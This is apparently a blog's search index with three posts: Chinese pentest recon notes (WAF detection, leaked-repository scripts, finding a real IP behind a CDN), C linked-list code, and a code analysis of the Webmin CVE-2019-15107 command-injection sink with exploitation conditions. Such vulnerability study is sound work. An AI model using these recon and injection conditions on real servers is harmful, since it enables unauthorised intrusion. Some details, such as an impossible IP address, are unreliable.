F12下networks下查看相关php，js文件收集目录等信息-&gt;header-&gt;server,X-Powered-By 判断操作系统：在url上通过大小写判断，例如?id&#x3D;与?ID&#x3D;返回相同为win，不同异常为liunx（一般情况下） ​ TTL值判断操作系统，利用ping命令，根据TTL大小判断 源码框架已知-&gt;查找公开漏洞库 源码已知-&gt;白盒-&gt;代码审计 中间件安全-&gt;各种CVE app抓包-&gt;模拟器-&gt;burp&#x2F;fidder&#x2F;charles-&gt;安装证书，设置代理-&gt;抓包 ​ |__调用各种api 例如api.map.baidu​ |__查看各种历史包-&gt;域名+文件名称(加载好session与cookie)-&gt;_返回各种信息​ |_在无工具下可通过开发者工具的network的response来搜集 子域名查看：例如www.recyvan.com -&gt;查找recyvan.com和recyvan.cn 搜索备份文件(zip,bak,back)，git文件（泄露）-&gt;githack脚本攻击，composer.json泄露，web-inf泄露（RoarCTF-2019-Easyjava）SVN泄露-&gt;SVNhack脚本攻击，D_store泄露，CVS泄露 服务器网络架构： ​\t外网：171.40.778.855 ​\t内网：192.168.1.100-&gt;WEB 外网出口（交换机）做一个映射（反向代理） 主动192.168.1.100-&gt;web流量给到171.40.78.83 waf识别软件：waf00f识别waf是否存在和类别 kali自带插件lbd +url识别负载均衡 CDN绕过CDN即內容分发网络（英语：Content Delivery Network或Content Distribution Network，缩写：CDN）是指一种透过互联网互相连接的电脑网络系统，利用最靠近每位用户的服务器，更快、更可靠地将音乐、图片、影片、应用程序及其他文件发送给用户，来提供高性能、可扩展性及低成本的网络内容传递给用户。例如（阿里云的cDN架构，节选自《秒懂边缘云 | CDN基础入门：CDN原理及架构》） 当前阿里云 CDN 主要由调度系统、链路质量系统、缓存系统、支撑系统等子系统组成，这些子系统共同构成了 CDN 大脑神经网络来保证 CDN 的日常服务。 调度系统：支持策略中心、DNS、HTTPDNS和302调度模式。当终端用户发起访问请求时，用户的访问请求会先进行域名DNS解析，调度系统将根据用户解析请求中携带的 IP 地址判断其区域、运营商，为用户选择并返回最佳接入节点 IP （DNS 未携带客户端 IP 时，调度根据DNS IP决策）。 链路质量系统：实时监测缓存系统中所有节点和链路的实时负载以及健康状况。调度系统在决策最优节点时，也会综合链路质量、实时负载等因素来为用户分配服务节点。 缓存系统：用户通过收到的最佳接入节点 IP 访问对应的缓存节点，如果节点已经缓存了用户请求的资源，会直接将资源返回给用户。 支撑系统：支撑服务系统包括天眼、数据智能和配置管理系统，分别具备了资源监测、数据分析和配置管理能力。 创建 CDN 加速域名后，CDN 将为您的加速域名分配 CNAME 记录值，您需要将域名解析至 CNAME 记录后才能接入CDN的智能调度系统。在正式接入 CDN 后，终端用户访问时经过的流程大致如下： 本机 DNS 发起对访问域名的解析查询，加速域名权威DNS将响应您所配置的 CNAME 地址，DNS 继续对CNAME 记录发起查询后，解析结果将根据阿里云调度系统决策，从权威 DNS 中返回最优节点 IP 地址。 用户本地发起和节点 IP 的建联，建联后开始发送 HTTP 请求，此时访问节点为边缘节点（L1），如果 L1 节点已缓存了用户请求的文件，L1 将直接返回缓存内容给用户，此时请求结束。 如果边缘节点（L1）没有该文件的缓存，将回源至上层节点（L2）获取资源，如果 L2 节点已缓存用户请求的文件，将直接返回缓存内容给L1，L1响应给用户并将文件缓存到本地，此时请求结束。 如果 L2 节点也没有用户所请求的文件，L2 节点将根据您在CDN控制台上的配置，回源到您的业务源站拉取资源返回给 L1 ，并将文件缓存到 L2 本地，此时请求结束。 前置知识： 传统访问：用户访问域名-&gt;解析服务器ip-&gt;访问目标主机 普通CDN：用户访问域名-&gt;CDN节点-&gt;真实服务器ip-&gt;访问目标主机 带WAF的CDN：用户访问域名-&gt;CDN节点（WAF）-&gt;真实服务器ip-&gt;访问目标主机 CDN配置 加速域名-需要启动加速的域名 加速区域-需要启动加速的地区 加速类型-需要启动加速的资源 判断标准 nslookup，各地（超级）ping-&gt;出现多个不同ip-&gt;CDN服务存在 绕过方法 查看子域名（有概率没有CDN加速）-&gt;google语法等 DNS历史解析记录-&gt;历史解析记录，可能会找到网站使用CDN前的解析记录，从而获取真实ip iphistory：https://viewdns.info/iphistory/ DNS查询：（https://dnsdb.io/zh-cn/） DNS历史查询：（https://securitytrails.com/） head头部查看邮箱注册，邮箱找回密码等，大多为目标服务器发送 利用SSL证书寻找真实IP 待更新。。。。勿急。。。。","tags":["信息搜集，渗透测试，网络安全，红蓝对抗"],"categories":["网络安全"]},{"title":"线性结构总结","path":"/2023/11/01/xian-xing-jie-gou-zong-jie/","content":"线性结构总结线性表线性表是由n&gt;&#x3D;0个性质相同的数据元素组成的有限序列，n为线性长度。 线性表的主要操作包括创建空线性表，判断线性表是否为空，以及插入，删除和查找等操作。 顺序表顺序表是用一组地址连续的储存单元依次储线性表中的各个元素，通过位置来表示数据元素之间的线性逻辑关系。 顺序表的相邻元素在物理位置上也是相邻的。 优点： 可以快速获取下标的数据元素，时间复杂度为O(1) 逻辑关系是一对一的关系，连续存储单元足以储存，不需要增加额外的存储空间 缺点： 插入和删除操作需要移动大量的元素，时间复杂度为O(n) 线性表的存储空间大小难以确定，并且不好扩展 造成存储空间碎片化 以下为顺序表的基本功能 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&#123; SeqList slist = (SeqList)malloc(sizeof(struct List)); /*申请结构体List空间*/ if (slist != NULL) &#123; slist-&gt;elem = (DataType*)malloc(sizeof(DataType) * m); /*申请顺序表空间，大小为m个DataType空间*/ if (slist-&gt;elem) &#123; slist-&gt;Max = m;/*顺序表的最大值*/ slist-&gt;n = 0; /*顺序表长度赋值为0*/ return(slist); &#125; else free(slist); &#125; printf(&quot;out of space!! &quot;); return NULL;&#125;int IsNullList_seq(SeqList slist)/*判断顺序表是否为空*/&#123; return(slist-&gt;n == 0);&#125;int InsertPre_seq(SeqList slist, int p, DataType x)/*在线性表slist的p位置之前插入x*/&#123; int q; if (slist-&gt;n &gt;= slist-&gt;Max) &#123; /*顺序表满溢出*/ printf(&quot;overflow&quot;); return(0); &#125; if (p&lt;0 || p&gt;slist-&gt;n) &#123; /*不存在下标为p的元素*/ printf(&quot;not exist! &quot;); return(0); &#125; for (q = slist-&gt;n - 1; q &gt;= p; q--)/*插入位置以及之后的元素后移*/ slist-&gt;elem[q + 1] = slist-&gt;elem[q]; slist-&gt;elem[p] = x; /*插入元素x*/ slist-&gt;n = slist-&gt;n + 1; /*顺序表长度加1*/ return(1);&#125;void print(SeqList slist)//打印顺序表&#123; int i; for (i = 0; i &lt; slist-&gt;n; i++) printf(&quot;%d &quot;, slist-&gt;elem[i]);&#125;int DelIndex_seq(SeqList slist, int p) //删除下标为p的元素&#123; int q; if (p &lt; 0 || p &gt;= slist-&gt;n) &#123;//不存在下标为p的元素 printf(&quot;Not exist &quot;); return 0; &#125; for (q = p; q &lt; slist-&gt;n - 1; q++) &#123; //p位置之后的元素向前移动 slist-&gt;elem[q] = slist-&gt;elem[q + 1]; &#125; slist-&gt;n = slist-&gt;n - 1; //顺序表长度减1 return 1;&#125;``` 链式线性表-单链表其中的元素的储存位置是任意的，具体位置在程序运行时动态分布。其在物理位置上相邻元素并不相邻。 存储分配： 顺序 -&gt; 一段地址连续的存储空间 链式 -&gt; 任意地址存储空间 时间： 查找 顺序 -&gt; O(1) 链式 -&gt; O(n) 插入和删除 顺序 -&gt; O(n) 链式 -&gt; 寻找相应的节点，时间复杂度为O(n)，然后，插入和&gt; &gt;删除为O(1) 空间： 顺序 -&gt; 需要提前分配存储空间，分配大了，浪费空间，分配小了，容易发生上溢 链式 -&gt; 不需要提前分配空间，只要有存储空间分配就行，数据元素个数只受可分配存储空间&gt; 大小的限制 以下是其基本功能 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667//判断head指针是否为空LinkList SetNullList_Link() &#123; LinkList head = (LinkList)malloc(sizeof(struct Node)); if (head != NULL) head-&gt;next = NULL; else printf(&quot;alloc failure&quot;); return head; &#125;//创建单链表--&gt;尾插法void CreateList_Tail(struct Node* head)&#123; PNode p = NULL; PNode q = head; DataType data; scanf(&quot;%d&quot;, &amp;data); while (data != -1) &#123; p = (struct Node*)malloc(sizeof(struct Node)); p-&gt;data = data; p-&gt;next = NULL; q-&gt;next = p; q = p; scanf(&quot;%d&quot;, &amp;data); &#125;&#125;int InsertPre_link(LinkList llist,LinkList p, DataType x)&#123; LinkList pre=llist,q=NULL; while(pre-&gt;next!= p)&#123; pre=pre-&gt;next; &#125; q=(LinkList)malloc(sizeof(LinkList)); q-&gt;data=x; q-&gt;next=p; pre-&gt;next=q;&#125;void InsertPost_link_value(LinkList head,int finddata,int insertdata)&#123; LinkList p=head; while(p-&gt;data!=finddata)&#123; p=p-&gt;next; &#125; InsertPre_link(head,p,insertdata);&#125;//打印单链表void print(LinkList head) &#123; PNode p = head-&gt;next; while (p) &#123; printf(&quot;%d &quot;, p-&gt;data); p = p-&gt;next; &#125;&#125;//删除单链表并释放空间void DestoryList_Link(LinkList head) &#123; PNode pre = head; PNode p = pre-&gt;next; while (p) &#123; free(pre); pre = p; p = pre-&gt;next; &#125; free(pre);&#125;``` 单循环链表在单链表的基础上将最后一个节点的指针指向链表的第一个节点，形成一个环，称之为单循环链表。 双链表和双循环链表双链表存在钱去和后继 优点 可以实现双向查找缺点 需要额外的储存空间存放前驱节点 双循环链表把双链表的最后的一个节点的后继指针指向第一个节点，把第一个节点的前驱指针指向最后一个节点，就组成了双循环链表。 栈栈（英语：stack）又称为堆栈或堆叠，栈作为一种数据结构，是一种只能在一端进行插入和删除操作的特殊线性表。它按照先进后出的原则存储数据，先进入的数据被压入栈底，最后的数据在栈顶，需要读数据的时候从栈顶开始弹出数据（最后一个数据被第一个读出来）。栈具有记忆作用，对栈的插入与删除操作中，不需要改变栈底指针。 定义：只允许在一端进行插入或删除的线性表 栈顶（top） ：允许进行插入或删除的一端 栈底（bottom）: 与栈顶相对应的一端 特点： 先进后出 包含顺序栈，双栈等 队列队列是一种特殊的线性表，特殊之处在于它只允许在表的前端（front）进行删除操作，而在表的后端（rear）进行插入操作，和栈一样，队列是一种操作受限制的线性表。进行插入操作的端称为队尾，进行删除操作的端称为队头。","tags":["C语言,数据结构,线性表"],"categories":["C语言"]},{"title":"关于webmin-CVE-2019-15107的注入点代码分析","path":"/2023/09/20/guan-yu-webmin-cve-2019-15107-de-zhu-ru-dian-dai-ma-fen-xi/","content":"浏览了多篇webmin的CVE-2019-15107后发现，有许多错误的playload或者存在不同版本对应的playload不通用。因此想要了解一下指定版本下的注入点的成因。 漏洞信息Webmin是目前功能最强大的基于Web的Unix系统管理工具。管理员通过浏览器访问Webmin的各种管理功能并完成相应的管理动作。目前Webmin支持绝大多数的Unix系统，这些系统除了各种版本的linux以外还包括：AIX、HPUX、Solaris、Unixware、Irix和FreeBSD等。 在19年，Pentest上发布了CVE-2019-15107未授权远程代码执行漏洞。写到当用户在webmin(1.890~1.920)版本上开启Webmin密码重置【使用过期的密码提示用户输入新密码】功能后，攻击者可以通过向password_change.cgi功能页面发送特定的POST请求在目标系统中执行任意命令，并且无需身份验证即未授权RCE。而在其中，POST请求需要填写多种参数，而参数之间又有一些特定相关性，因此要通过代码审计才能搞清楚。 环境配置事项在安装webmin建议使用官方的一键部署脚本安装，可以避免不必要的环境依赖问题。安装完成后，切记打开【使用过期的密码提示用户输入新密码】功能。查看miniserv.conf中passwd_mode&#x3D;2是否已成立。2表示【使用过期的密码提示用户输入新密码】已修改成功。 123456789101112131415syslog=1session=1premodules=WebminCoreuserfile=/etc/webmin/miniserv.userskeyfile=/etc/webmin/miniserv.pempasswd_file=/etc/shadowpasswd_uindex=0passwd_pindex=1passwd_cindex=2passwd_mindex=4passwd_mode=2preroot=gray-themepassdelay=1cipher_list_def=1root=/usr/libexec/webmin 代码分析查看webmin漏洞处的关键源代码源代码: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269#!/usr/local/bin/perl# password_change.cgi# Actually update a user&#x27;s password by directly modifying /etc/shadowBEGIN &#123; push(@INC, &quot;.&quot;); &#125;;use WebminCore;$ENV&#123;&#x27;MINISERV_INTERNAL&#x27;&#125; || die &quot;Can only be called by miniserv.pl&quot;;&amp;init_config();&amp;ReadParse();&amp;get_miniserv_config(\\%miniserv);$miniserv&#123;&#x27;passwd_mode&#x27;&#125; == 2 || die &quot;Password changing is not enabled!&quot;;# Validate inputs$in&#123;&#x27;new1&#x27;&#125; ne &#x27;&#x27; || &amp;pass_error($text&#123;&#x27;password_enew1&#x27;&#125;);$in&#123;&#x27;new1&#x27;&#125; eq $in&#123;&#x27;new2&#x27;&#125; || &amp;pass_error($text&#123;&#x27;password_enew2&#x27;&#125;);# Is this a Webmin user?if (&amp;foreign_check(&quot;acl&quot;)) &#123;\t&amp;foreign_require(&quot;acl&quot;, &quot;acl-lib.pl&quot;);\t($wuser) = grep &#123; $_-&gt;&#123;&#x27;name&#x27;&#125; eq $in&#123;&#x27;user&#x27;&#125; &#125; &amp;acl::list_users();\tif ($wuser-&gt;&#123;&#x27;pass&#x27;&#125; eq &#x27;x&#x27;) &#123; # A Webmin user, but using Unix authentication $wuser = undef; &#125;\telsif ($wuser-&gt;&#123;&#x27;pass&#x27;&#125; eq &#x27;*LK*&#x27; || $wuser-&gt;&#123;&#x27;pass&#x27;&#125; =~ /^\\!/) &#123; &amp;pass_error(&quot;Webmin users with locked accounts cannot change &quot;. &quot;their passwords!&quot;); &#125;\t&#125;if (!$in&#123;&#x27;pam&#x27;&#125; &amp;&amp; !$wuser) &#123;\t$miniserv&#123;&#x27;passwd_cindex&#x27;&#125; ne &#x27;&#x27; &amp;&amp; $miniserv&#123;&#x27;passwd_mindex&#x27;&#125; ne &#x27;&#x27; || die &quot;Missing password file configuration&quot;;\t&#125;if ($wuser) &#123;\t# Update Webmin user&#x27;s password\t$enc = &amp;acl::encrypt_password($in&#123;&#x27;old&#x27;&#125;, $wuser-&gt;&#123;&#x27;pass&#x27;&#125;);\t$enc eq $wuser-&gt;&#123;&#x27;pass&#x27;&#125; || &amp;pass_error($text&#123;&#x27;password_eold&#x27;&#125;,qx/$in&#123;&#x27;old&#x27;&#125;/);\t$perr = &amp;acl::check_password_restrictions($in&#123;&#x27;user&#x27;&#125;, $in&#123;&#x27;new1&#x27;&#125;);\t$perr &amp;&amp; &amp;pass_error(&amp;text(&#x27;password_enewpass&#x27;, $perr));\t$wuser-&gt;&#123;&#x27;pass&#x27;&#125; = &amp;acl::encrypt_password($in&#123;&#x27;new1&#x27;&#125;);\t$wuser-&gt;&#123;&#x27;temppass&#x27;&#125; = 0;\t&amp;acl::modify_user($wuser-&gt;&#123;&#x27;name&#x27;&#125;, $wuser);\t&amp;reload_miniserv();\t&#125;elsif ($gconfig&#123;&#x27;passwd_cmd&#x27;&#125;) &#123;\t# Use some configured command\t$passwd_cmd = &amp;has_command($gconfig&#123;&#x27;passwd_cmd&#x27;&#125;);\t$passwd_cmd || &amp;pass_error(&quot;The password change command &lt;tt&gt;$gconfig&#123;&#x27;passwd_cmd&#x27;&#125;&lt;/tt&gt; was not found&quot;);\t&amp;foreign_require(&quot;proc&quot;, &quot;proc-lib.pl&quot;);\t&amp;clean_environment();\t$ENV&#123;&#x27;REMOTE_USER&#x27;&#125; = $in&#123;&#x27;user&#x27;&#125;;\t# some programs need this\t$passwd_cmd .= &quot; &quot;.quotemeta($in&#123;&#x27;user&#x27;&#125;);\t($fh, $fpid) = &amp;proc::pty_process_exec($passwd_cmd, 0, 0);\t&amp;reset_environment();\twhile(1) &#123; local $rv = &amp;wait_for($fh, &#x27;(new|re-enter).*:&#x27;, &#x27;(old|current|login).*:&#x27;, &#x27;pick a password&#x27;, &#x27;too\\s+many\\s+failures&#x27;, &#x27;attributes\\s+changed\\s+on|successfully\\s+changed&#x27;, &#x27;pick your passwords&#x27;); $out .= $wait_for_input; sleep(1); if ($rv == 0) &#123; # Prompt for the new password syswrite($fh, $in&#123;&#x27;new1&#x27;&#125;.&quot; &quot;, length($in&#123;&#x27;new1&#x27;&#125;)+1); &#125; elsif ($rv == 1) &#123; # Prompt for the old password syswrite($fh, $in&#123;&#x27;old&#x27;&#125;.&quot; &quot;, length($in&#123;&#x27;old&#x27;&#125;)+1); &#125; elsif ($rv == 2) &#123; # Request for a menu option (SCO?) syswrite($fh, &quot;1 &quot;, 2); &#125; elsif ($rv == 3) &#123; # Failed too many times last; &#125; elsif ($rv == 4) &#123; # All done last; &#125; elsif ($rv == 5) &#123; # Request for a menu option (HP/UX) syswrite($fh, &quot;p &quot;, 2); &#125; else &#123; last; &#125; last if (++$count &gt; 10); &#125;\t$crv = close($fh);\tsleep(1);\twaitpid($fpid, 1);\tif ($? || $count &gt; 10 || $out =~ /error|failed/i || $out =~ /bad\\s+password/i) &#123; &amp;pass_error(&quot;&lt;tt&gt;&quot;.&amp;html_escape($out).&quot;&lt;/tt&gt;&quot;); &#125;\t&#125;elsif ($in&#123;&#x27;pam&#x27;&#125;) &#123;\t# Use PAM to make the change..\teval &quot;use Authen::PAM;&quot;;\tif ($@) &#123; &amp;pass_error(&amp;text(&#x27;password_emodpam&#x27;, $@)); &#125;\t# Check if the old password is correct\t$service = $miniserv&#123;&#x27;pam&#x27;&#125; ? $miniserv&#123;&#x27;pam&#x27;&#125; : &quot;webmin&quot;;\t$pamh = new Authen::PAM($service, $in&#123;&#x27;user&#x27;&#125;, \\&amp;pam_check_func);\t$rv = $pamh-&gt;pam_authenticate();\t$rv == PAM_SUCCESS() || &amp;pass_error($text&#123;&#x27;password_eold&#x27;&#125;);\t$pamh = undef;\t# Change the password with PAM, in a sub-process. This is needed because\t# the UID must be changed to properly signal to the PAM libraries that\t# the password change is not being done by the root user.\t$temp = &amp;transname();\t$pid = fork();\t@uinfo = getpwnam($in&#123;&#x27;user&#x27;&#125;);\tif (!$pid) &#123; ($&gt;, $&lt;) = (0, $uinfo[2]); $pamh = new Authen::PAM(&quot;passwd&quot;, $in&#123;&#x27;user&#x27;&#125;, \\&amp;pam_change_func); $rv = $pamh-&gt;pam_chauthtok(); open(TEMP, &quot;&gt;$temp&quot;); print TEMP &quot;$rv &quot;; print TEMP ($messages || $pamh-&gt;pam_strerror($rv)),&quot; &quot;; close(TEMP); exit(0); &#125;\twaitpid($pid, 0);\topen(TEMP, $temp);\tchop($rv = &lt;TEMP&gt;);\tchop($messages = &lt;TEMP&gt;);\tclose(TEMP);\tunlink($temp);\t$rv == PAM_SUCCESS || &amp;pass_error(&amp;text(&#x27;password_epam&#x27;, $messages));\t$pamh = undef;\t&#125;else &#123;\t# Directly update password file\t# Read shadow file and find user\t&amp;lock_file($miniserv&#123;&#x27;passwd_file&#x27;&#125;);\t$lref = &amp;read_file_lines($miniserv&#123;&#x27;passwd_file&#x27;&#125;);\tfor($i=0; $i&lt;@$lref; $i++) &#123; @line = split(/:/, $lref-&gt;[$i], -1); local $u = $line[$miniserv&#123;&#x27;passwd_uindex&#x27;&#125;]; if ($u eq $in&#123;&#x27;user&#x27;&#125;) &#123; $idx = $i; last; &#125; &#125;\tdefined($idx) || &amp;pass_error($text&#123;&#x27;password_euser&#x27;&#125;);\t# Validate old password\t&amp;unix_crypt($in&#123;&#x27;old&#x27;&#125;, $line[$miniserv&#123;&#x27;passwd_pindex&#x27;&#125;]) eq $line[$miniserv&#123;&#x27;passwd_pindex&#x27;&#125;] || &amp;pass_error($text&#123;&#x27;password_eold&#x27;&#125;);\t# Make sure new password meets restrictions\tif (&amp;foreign_check(&quot;changepass&quot;)) &#123; &amp;foreign_require(&quot;changepass&quot;, &quot;changepass-lib.pl&quot;); $err = &amp;changepass::check_password($in&#123;&#x27;new1&#x27;&#125;, $in&#123;&#x27;user&#x27;&#125;); &amp;pass_error($err) if ($err); &#125;\telsif (&amp;foreign_check(&quot;useradmin&quot;)) &#123; &amp;foreign_require(&quot;useradmin&quot;, &quot;user-lib.pl&quot;); $err = &amp;useradmin::check_password_restrictions( $in&#123;&#x27;new1&#x27;&#125;, $in&#123;&#x27;user&#x27;&#125;); &amp;pass_error($err) if ($err); &#125;\t# Set new password and save file\t$salt = chr(int(rand(26))+65) . chr(int(rand(26))+65);\t$line[$miniserv&#123;&#x27;passwd_pindex&#x27;&#125;] = &amp;unix_crypt($in&#123;&#x27;new1&#x27;&#125;, $salt);\t$days = int(time()/(24*60*60));\t$line[$miniserv&#123;&#x27;passwd_cindex&#x27;&#125;] = $days;\t$lref-&gt;[$idx] = join(&quot;:&quot;, @line);\t&amp;flush_file_lines();\t&amp;unlock_file($miniserv&#123;&#x27;passwd_file&#x27;&#125;);\t&#125;# Change password in Usermin tooif (&amp;get_product_name() eq &#x27;usermin&#x27; &amp;&amp; &amp;foreign_check(&quot;changepass&quot;)) &#123;\t&amp;foreign_require(&quot;changepass&quot;, &quot;changepass-lib.pl&quot;);\t&amp;changepass::change_mailbox_passwords( $in&#123;&#x27;user&#x27;&#125;, $in&#123;&#x27;old&#x27;&#125;, $in&#123;&#x27;new1&#x27;&#125;);\t&amp;changepass::change_samba_password( $in&#123;&#x27;user&#x27;&#125;, $in&#123;&#x27;old&#x27;&#125;, $in&#123;&#x27;new1&#x27;&#125;);\t&#125;&amp;header(undef, undef, undef, undef, 1, 1);print &quot;&lt;center&gt;&lt;h3&gt;&quot;,&amp;text(&#x27;password_done&#x27;, &quot;/&quot;),&quot;&lt;/h3&gt;&lt;/center&gt; &quot;;&amp;footer();sub pass_error&#123;&amp;header(undef, undef, undef, undef, 1, 1);print &amp;ui_hr();print &quot;&lt;center&gt;&lt;h3&gt;&quot;,$text&#123;&#x27;password_err&#x27;&#125;,&quot; : &quot;,@_,&quot;&lt;/h3&gt;&lt;/center&gt; &quot;;print &amp;ui_hr();&amp;footer();exit;&#125;sub pam_check_func&#123;my @res;while ( @_ ) &#123;\tmy $code = shift;\tmy $msg = shift;\tmy $ans = &quot;&quot;;\t$ans = $in&#123;&#x27;user&#x27;&#125; if ($code == PAM_PROMPT_ECHO_ON());\t$ans = $in&#123;&#x27;old&#x27;&#125; if ($code == PAM_PROMPT_ECHO_OFF());\tpush @res, PAM_SUCCESS();\tpush @res, $ans;\t&#125;push @res, PAM_SUCCESS();return @res;&#125;sub pam_change_func&#123;my @res;while ( @_ ) &#123;\tmy $code = shift;\tmy $msg = shift;\tmy $ans = &quot;&quot;;\t$messages = $msg;\tif ($code == PAM_PROMPT_ECHO_ON()) &#123; # Assume asking for username push @res, PAM_SUCCESS(); push @res, $in&#123;&#x27;user&#x27;&#125;; &#125;\telsif ($code == PAM_PROMPT_ECHO_OFF()) &#123; # Assume asking for a password (old first, then new) push @res, PAM_SUCCESS(); if ($msg =~ /old|current|login/i) &#123; push @res, $in&#123;&#x27;old&#x27;&#125;; &#125; else &#123; push @res, $in&#123;&#x27;new1&#x27;&#125;; &#125; &#125;\telse &#123; # Some message .. ignore it push @res, PAM_SUCCESS(); push @res, undef; &#125;\t&#125;push @res, PAM_SUCCESS();return @res;&#125; 在如下代码下会判断是否开启了密码重置功能，对应 miniserv.conf中的passwd_mode=2 1$miniserv&#123;&#x27;passwd_mode&#x27;&#125; == 2 || die &quot;Password changing is not enabled!&quot;; 在validate input下方代码中会进行判断new1与new2是否符合规定，并两者是否判断相等。 12# Validate inputs$in&#123;&#x27;new1&#x27;&#125; ne &#x27;&#x27; || &amp;pass_error($text&#123;&#x27;password_enew1&#x27;&#125;); $in&#123;&#x27;new1&#x27;&#125; eq $in&#123;&#x27;new2&#x27;&#125; || &amp;pass_error($text&#123;&#x27;password_enew2&#x27;&#125;); 假设new1与new2并不相等,则会进入到pass_error函数中去。查看pass_error()函数。 1234567891011sub pass_error&#123;&amp;header(undef, undef, undef, undef, 1, 1);print &amp;ui_hr();print &quot;&lt;center&gt;&lt;h3&gt;&quot;,$text&#123;&#x27;password_err&#x27;&#125;,&quot; : &quot;,@_,&quot;&lt;/h3&gt;&lt;/center&gt; &quot;;print &amp;ui_hr();&amp;footer();exit;&#125; 可以看出该函数只是在密码不规范下会print错误信息并执行exit。在18-31行处代码可以看出用户提交的user并进行判断 1234567891011121314# Is this a Webmin user?if (&amp;foreign_check(&quot;acl&quot;)) &#123;\t&amp;foreign_require(&quot;acl&quot;, &quot;acl-lib.pl&quot;);\t($wuser) = grep &#123; $_-&gt;&#123;&#x27;name&#x27;&#125; eq $in&#123;&#x27;user&#x27;&#125; &#125; &amp;acl::list_users();\tif ($wuser-&gt;&#123;&#x27;pass&#x27;&#125; eq &#x27;x&#x27;) &#123; # A Webmin user, but using Unix authentication $wuser = undef; &#125;\telsif ($wuser-&gt;&#123;&#x27;pass&#x27;&#125; eq &#x27;*LK*&#x27; || $wuser-&gt;&#123;&#x27;pass&#x27;&#125; =~ /^\\!/) &#123; &amp;pass_error(&quot;Webmin users with locked accounts cannot change &quot;. &quot;their passwords!&quot;); &#125;\t&#125; 可以看出此处先利用&amp;引用函数foreign_check()来引入acl-lib.pl文件进行用户信息列表的查询。这里参考了QFtm大佬的文章，是通过设置断点acl::list_users();在对perl代码(如下图)审计，然后通过Dumper函数进行打印。 1234567891011BEGIN &#123; push(@INC, &quot;.&quot;); &#125;;use WebminCore; use Data::Dumper; ...... # Is this a Webmin user? if (&amp;foreign_check(&quot;acl&quot;)) &#123;\t&amp;foreign_require(&quot;acl&quot;, &quot;acl-lib.pl&quot;); ($wuser) = grep &#123; $_-&gt;&#123;&#x27;name&#x27;&#125; eq $in&#123;&#x27;user&#x27;&#125; &#125; &amp;acl::list_users(); die Dumper(acl::list_users());&#125; ........ 因此在acl::list_users();获得用户信息后，在($wuser) = grep &#123; $_-&gt;&#123;&#39;name&#39;&#125; eq $in&#123;&#39;user&#39;&#125;中grep会过滤出已存在的用户，如果用户不存在，则$wuser赋值为undef。 注： $_-&gt;&#123;&#39;name&#39;&#125;指用户在web界面输入的user参数，$in&#123;&#39;user&#39;&#125;为已存在的webmin用户。 undef是perl中变量未初始化时的默认值。当这个未初始化的变量被当做整型来使用时，那么undef就是0；而被当做字符串来使用时，undef就是空字符串。因此当在perl中使用一个未经过初始化的变量时，程序的运行是没有问题的。 但是在undef在if条件里默认为false即值为0，于是假设用户输入的user参数为空，则 1234if ($wuser-&gt;&#123;&#x27;pass&#x27;&#125; eq &#x27;x&#x27;) &#123; # A Webmin user, but using Unix authentication $wuser = undef; &#125; $wuser=undef,当程序继续运行时，在下方的if会将其$wuser判断为真{1&#x3D;1}。在进行用户密码与’x’的比较,如果为系统用户的话，$wuser被赋予值为undef，使程序跳过以下代码： 123456789//更改系统用户账号密码if ($wuser) &#123; # Update Webmin user&#x27;s password $enc = &amp;acl::encrypt_password($in&#123;&#x27;old&#x27;&#125;, $wuser-&gt;&#123;&#x27;pass&#x27;&#125;); $enc eq $wuser-&gt;&#123;&#x27;pass&#x27;&#125; || &amp;pass_error($text&#123;&#x27;password_eold&#x27;&#125;,qx/$in&#123;&#x27;old&#x27;&#125;/); $perr = &amp;acl::check_password_restrictions($in&#123;&#x27;user&#x27;&#125;, $in&#123;&#x27;new1&#x27;&#125;); $perr &amp;&amp; &amp;pass_error(&amp;text(&#x27;password_enewpass&#x27;, $perr)); $wuser-&gt;&#123;&#x27;pass&#x27;&#125; = &amp;acl::encrypt_password($in&#123;&#x27;new1&#x27;&#125;); $wuser-&gt;&#123;&#x27;temppass&#x27;&#125; = 0; &amp;acl::modify_user($wuser-&gt;&#123;&#x27;name&#x27;&#125;, $wuser); &amp;reload_miniserv(); &#125; 整体利用情况 整理思路可知，漏洞利用条件可为如下几种 1234561、开启密码重置功能【针对有些版本不需要开启密码重置功能，比如：webmin 1.890】2、user不存在、old=任意字符|系统命令、new1==new2 或者user不存在、old=系统命令、new1==new2 或者user存在但不为特定系统用户【指webmin添加的系统用户】、old为假（任意字符|系统命令 或 系统命令）、new1==new2","tags":["php代码分析，webmin"],"categories":["php代码"]},{"title":"friends","path":"/friends/index.html","content":"https://xaoxuu.com/blog/20221029/https://xaoxuu.com/blog/20221029/"},{"path":"/google06353994c652a639.html","content":"google-site-verification: google06353994c652a639.html"}]